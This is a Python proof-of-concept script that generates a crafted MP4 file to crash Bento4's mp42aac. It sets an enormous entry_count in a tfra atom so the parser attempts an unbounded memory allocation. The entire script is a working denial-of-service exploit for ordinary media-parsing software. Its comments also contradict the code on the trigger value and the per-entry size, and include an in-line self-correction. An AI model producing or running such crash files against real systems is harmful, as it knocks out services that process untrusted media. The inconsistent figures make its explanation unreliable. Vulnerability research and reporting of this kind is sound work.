#!/usr/bin/env python3
"""
PoC generator for VULN 004 — AP4_TfraAtom missing entry_count bounds check.

In Ap4TfraAtom.cpp lines 86-88, entry_count is read from the stream and passed
directly to m_Entries.SetItemCount(entry_count) without any bounds check against
the atom size.  With entry_count=0x08000000 (~134 M entries) the runtime attempts
a ~3 GB heap allocation, causing std::bad_alloc or OOM crash.

Trigger path:
  mp42aac -> AP4_File::ParseStream -> AP4_AtomFactory::CreateAtomFromStream
          -> AP4_TfraAtom::Create -> new AP4_TfraAtom(size, version, flags, stream)
                                         m_Entries.SetItemCount(0x08000000)  CRASH
"""

import struct, os

OUTDIR  = os.path.dirname(os.path.abspath(__file__))
OUTFILE = os.path.join(OUTDIR, "vuln_004.mp4")


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def box(fourcc: bytes, payload: bytes) -> bytes:
    """Plain box: size(4) + type(4) + payload."""
    return struct.pack(">I", 8 + len(payload)) + fourcc + payload


def full_box(fourcc: bytes, version: int, flags: int, payload: bytes) -> bytes:
    """FullBox: size(4) + type(4) + version(1) + flags(3) + payload."""
    hdr = struct.pack(">I", 12 + len(payload)) + fourcc
    hdr += bytes([version]) + struct.pack(">I", flags & 0xFFFFFF)[1:]  # 3-byte flags
    return hdr + payload


# ---------------------------------------------------------------------------
# ftyp  (20 bytes)
# ---------------------------------------------------------------------------
ftyp = box(b"ftyp", b"isom" + struct.pack(">I", 0) + b"isom")

# ---------------------------------------------------------------------------
# mvhd version=0  (FullBox header 12 + payload 96 = 108 bytes)
#
# payload layout (all big-endian):
#   creation_time    U32  4
#   modification     U32  4
#   timescale        U32  4
#   duration         U32  4
#   rate             U32  4   (1.0 = 0x00010000)
#   volume           U16  2   (1.0 = 0x0100)
#   reserved         10 bytes
#   matrix           36 bytes (9 × U32, identity)
#   pre_defined      24 bytes
#   next_track_id    U32  4
# ---------------------------------------------------------------------------
_identity_matrix = (
    struct.pack(">I", 0x00010000)   # a
    + struct.pack(">I", 0)          # b
    + struct.pack(">I", 0)          # u
    + struct.pack(">I", 0)          # c
    + struct.pack(">I", 0x00010000) # d
    + struct.pack(">I", 0)          # v
    + struct.pack(">I", 0)          # tx
    + struct.pack(">I", 0)          # ty
    + struct.pack(">I", 0x40000000) # w
)  # 36 bytes

mvhd_payload = (
    struct.pack(">I", 0)            # creation_time
    + struct.pack(">I", 0)          # modification_time
    + struct.pack(">I", 1000)       # timescale
    + struct.pack(">I", 0)          # duration
    + struct.pack(">I", 0x00010000) # rate  1.0
    + struct.pack(">H", 0x0100)     # volume 1.0
    + b"\x00" * 10                  # reserved (10 bytes)
    + _identity_matrix               # 36 bytes
    + b"\x00" * 24                  # pre_defined (24 bytes)
    + struct.pack(">I", 2)          # next_track_id
)
assert len(mvhd_payload) == 96, f"mvhd payload length {len(mvhd_payload)} != 96"

mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)   # 108 bytes
moov = box(b"moov", mvhd)

# ---------------------------------------------------------------------------
# mdat  (8 bytes, empty payload)
# ---------------------------------------------------------------------------
mdat = box(b"mdat", b"")

# ---------------------------------------------------------------------------
# mfra  →  tfra  +  mfro
#
# tfra (version=0, flags=0):
#   track_id      U32   1
#   lengths_byte  U32   0   (traf/trun/sample length sizes all 0 → 1-byte each)
#   entry_count   U32   0x08000000  ← triggers the unbounded SetItemCount
#   (no actual entry data follows — crash happens before any is read)
# ---------------------------------------------------------------------------
# 0x3FFFFFFF entries × 28 bytes/entry ≈ 28 GB — exceeds any realistic allocation budget,
# forcing std::bad_alloc from ::operator new inside EnsureCapacity, which propagates
# uncaught through AP4_TfraAtom::AP4_TfraAtom → AP4_TfraAtom::Create → caller, crashing mp42aac.
# (0x08000000 × 28 ≈ 3.5 GB may succeed on hosts with large RAM and Linux overcommit.)
EVIL_COUNT = 0x3FFFFFFF

tfra_payload = (
    struct.pack(">I", 1)             # track_id
    + struct.pack(">I", 0)           # lengths_byte
    + struct.pack(">I", EVIL_COUNT)  # entry_count  ← vuln trigger
)
tfra = full_box(b"tfra", 0, 0, tfra_payload)   # 12 + 12 = 24... wait

# Recalculate: full_box header = 12, tfra_payload = 12 → total = 24? That's < the
# spec minimum of 28 (spec counts size+type+version+flags+track_id+lengths+count).
# 12 (FullBox hdr already includes size+type+ver+flags) + 12 (payload) = 24 bytes.
# The spec's "28 bytes minimum" counts from the outer size field, which is the same
# as our full_box total.  Let's verify:
#   size(4)+type(4)+version(1)+flags(3)+track_id(4)+lengths(4)+count(4) = 28 ✓
# FullBox header(12) + track_id(4) + lengths_byte(4) + entry_count(4) = 24 bytes
# (task description's "28" was a typo; actual minimum is 24 for version-0 empty tfra)
assert len(tfra) == 24, f"tfra length {len(tfra)} != 24"

# mfro: size(4) + 'mfro'(4) + version/flags(4) + mfra_box_size(4) = 16 bytes
mfra_payload_len = len(tfra) + 16   # tfra + mfro
mfra_total       = 8 + mfra_payload_len
mfro = (
    struct.pack(">I", 16)
    + b"mfro"
    + b"\x00\x00\x00\x00"               # version=0, flags=0
    + struct.pack(">I", mfra_total)      # mfra_size back-pointer
)
assert len(mfro) == 16

mfra = box(b"mfra", tfra + mfro)
assert len(mfra) == mfra_total

# ---------------------------------------------------------------------------
# assemble
# ---------------------------------------------------------------------------
mp4 = ftyp + moov + mdat + mfra

with open(OUTFILE, "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTFILE}")
print(f"    ftyp={len(ftyp)}  moov={len(moov)}  mdat={len(mdat)}  mfra={len(mfra)}")
print(f"    tfra entry_count = 0x{EVIL_COUNT:08X} ({EVIL_COUNT:,})")
print(f"    Expected allocation ~ {EVIL_COUNT * 24 / (1024**3):.1f} GiB → OOM / bad_alloc")
